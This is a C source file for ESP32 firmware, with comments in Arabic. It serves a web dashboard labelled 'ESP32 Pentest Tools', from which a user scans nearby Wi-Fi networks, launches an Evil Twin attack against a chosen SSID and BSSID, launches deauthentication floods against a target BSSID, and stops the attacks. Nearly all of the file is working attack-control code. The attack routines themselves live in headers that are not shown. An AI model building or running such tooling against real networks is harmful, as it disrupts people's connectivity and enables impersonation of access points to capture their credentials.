#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_http_server.h>
#include "evil_twin.h"
#include "deauther.h"
#include "target.h"
#include "wifiMng.h"

static const char *TAG = "WEBSERVER";
static httpd_handle_t server = NULL;

// صفحة الويب المدمجة (Dashboard) - كلها بالإنجليزية
const char *html_page = 
"<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
"<title>ESP32 Pentest Dashboard</title>"
"<style>body{font-family:sans-serif;background:#1e1e1e;color:#fff;text-align:center;padding:10px;direction:ltr;}"
"h1{color:#00ffcc;} .btn{background:#4444ff;color:white;padding:12px 20px;text-decoration:none;display:inline-block;font-size:14px;margin:4px;cursor:pointer;border-radius:6px;border:none;}"
".btn-danger{background:#ff4444;} .btn-success{background:#44aa44;}"
".btn:hover{opacity:0.8;} input, select{padding:10px;border-radius:5px;border:none;margin:10px;width:80%;max-width:300px;}"
".card{background:#2a2a2a;padding:15px;margin:10px auto;border-radius:10px;max-width:400px;}"
".status{color:#ffcc00; margin-top:10px; font-size:12px;}</style></head>"
"<body><h1>ESP32 Pentest Tools</h1>"

// قسم مسح الشبكات
"<div class='card'><h2>1. Scan Networks</h2>"
"<button class='btn' onclick='fetch(\"/scan\").then(r=>r.text()).then(t=>document.getElementById(\"scan-res\").innerHTML=t)'>Start Scan</button>"
"<div id='scan-res' class='status'>Click Scan to find networks...</div></div>"

// قسم Evil Twin
"<div class='card'><h2>2. Evil Twin</h2>"
"<form action='/start_eviltwin' method='get'>"
"<input type='text' name='ssid' placeholder='Target SSID (Must match scan)' required>"
"<input type='text' name='bssid' placeholder='Target BSSID (e.g., AA:BB:CC:DD:EE:FF)' required>"
"<input type='number' name='channel' placeholder='Channel (1-13)' required>"
"<input type='submit' class='btn btn-danger' value='Start Evil Twin'></form></div>"

// قسم Deauther
"<div class='card'><h2>3. Deauther</h2>"
"<form action='/start_deauth' method='get'>"
"<input type='text' name='bssid' placeholder='Target BSSID' required>"
"<input type='submit' class='btn btn-danger' value='Start Deauth'></form></div>"

// قسم إيقاف الهجمات
"<div class='card'><h2>4. Stop All Attacks</h2>"
"<button class='btn btn-success' onclick='fetch(\"/stop\")'>Stop & Return to Safe Mode</button></div>"

"</body></html>";

static esp_err_t index_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html_page, strlen(html_page));
    return ESP_OK;
}

// دالة المسح (ترجع أسماء الشبكات كـ Text)
static esp_err_t scan_handler(httpd_req_t *req) {
    wifi_scan_config_t scan_config = {
        .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = false
    };
    esp_wifi_scan_start(&scan_config, true); // مسح متزامن

    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);
    if (ap_count == 0) {
        httpd_resp_send(req, "No networks found.", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }
    
    wifi_ap_record_t *ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
    esp_wifi_scan_get_ap_records(&ap_count, ap_records);

    char *response = malloc(4096);
    strcpy(response, "<b>Found Networks:</b><br>");
    
    for (int i = 0; i < ap_count && i < 10; i++) { // عرض أول 10 شبكات فقط
        char line[150];
        sprintf(line, "SSID: %s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d<br>",
                (char*)ap_records[i].ssid,
                ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2],
                ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5],
                ap_records[i].primary);
        strcat(response, line);
    }
    
    free(ap_records);
    httpd_resp_send(req, response, strlen(response));
    free(response);
    return ESP_OK;
}

// دالة بدء Evil Twin
static esp_err_t start_eviltwin_handler(httpd_req_t *req) {
    char buf[200], ssid[32] = {0}, bssid_str[18] = {0}, channel_str[4] = {0};
    
    if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
        httpd_query_key_value(buf, "ssid", ssid, sizeof(ssid));
        httpd_query_key_value(buf, "bssid", bssid_str, sizeof(bssid_str));
        httpd_query_key_value(buf, "channel", channel_str, sizeof(channel_str));
        
        target_info_t target;
        memset(&target, 0, sizeof(target));
        strncpy(target.ssid, ssid, sizeof(target.ssid) - 1);
        target.channel = atoi(channel_str);
        
        // تحويل BSSID من نص إلى بايتات
        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &target.bssid[0], &target.bssid[1], &target.bssid[2],
               &target.bssid[3], &target.bssid[4], &target.bssid[5]);
               
        evil_twin_start_attack(&target);
        httpd_resp_send(req, "<h1 style='color:red;'>Evil Twin Started!</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }
    httpd_resp_send(req, "Error", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// دالة بدء Deauth
static esp_err_t start_deauth_handler(httpd_req_t *req) {
    char buf[100], bssid_str[18] = {0};
    if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
        httpd_query_key_value(buf, "bssid", bssid_str, sizeof(bssid_str));
        
        target_info_t target;
        memset(&target, 0, sizeof(target));
        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &target.bssid[0], &target.bssid[1], &target.bssid[2],
               &target.bssid[3], &target.bssid[4], &target.bssid[5]);
               
        // استخدام الدالة الصحيحة من deauther.h
        deauther_send_frames(&target, DEAUTHER_ATTACK_DEAUTH_FRAME);      
        httpd_resp_send(req, "<h1 style='color:red;'>Deauth Started!</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }
    httpd_resp_send(req, "Error", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// دالة الإيقاف
static esp_err_t stop_handler(httpd_req_t *req) {
    evil_twin_stop_attack();
    deauther_stop();
    httpd_resp_send(req, "<h1 style='color:green;'>All Attacks Stopped.</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

void http_server_start(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_uri_handlers = 10; // زيادة الحد لأن لدينا روابط كثيرة

    httpd_uri_t uris[] = {
        {.uri = "/", .method = HTTP_GET, .handler = index_handler},
        {.uri = "/scan", .method = HTTP_GET, .handler = scan_handler},
        {.uri = "/start_eviltwin", .method = HTTP_GET, .handler = start_eviltwin_handler},
        {.uri = "/start_deauth", .method = HTTP_GET, .handler = start_deauth_handler},
        {.uri = "/stop", .method = HTTP_GET, .handler = stop_handler}
    };

    if (httpd_start(&server, &config) == ESP_OK) {
        for (int i = 0; i < 5; i++) {
            httpd_register_uri_handler(server, &uris[i]);
        }
        ESP_LOGI(TAG, "Web server started with full dashboard");
    } else {
        ESP_LOGE(TAG, "Failed to start web server");
    }
}

void http_server_stop(void) {
    if (server) {
        httpd_stop(server);
        server = NULL;
    }
}
